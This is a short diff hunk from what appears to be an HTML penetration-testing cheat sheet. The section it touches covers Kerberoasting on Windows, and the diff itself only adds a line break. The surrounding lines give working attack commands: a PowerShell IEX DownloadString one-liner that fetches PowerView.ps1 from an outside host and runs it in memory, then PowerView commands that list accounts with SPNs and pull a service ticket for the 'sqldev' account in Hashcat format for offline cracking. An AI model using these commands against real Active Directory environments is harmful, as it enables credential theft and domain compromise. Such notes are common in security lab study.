@@ -91,7 +91,7 @@ Look on printers <br>
   <h2> Kerbroasting from windows </h2><br>
  
   Run Powerview (download fromn machine that can access the internet - IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.14.160:8000/PowerView.ps1') <br>
- Import-Module .\PowerView.ps1
+ Import-Module .\PowerView.ps1 <br>
 Get-DomainUser * -spn | select samaccountname <br>
   Now target account - Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
 
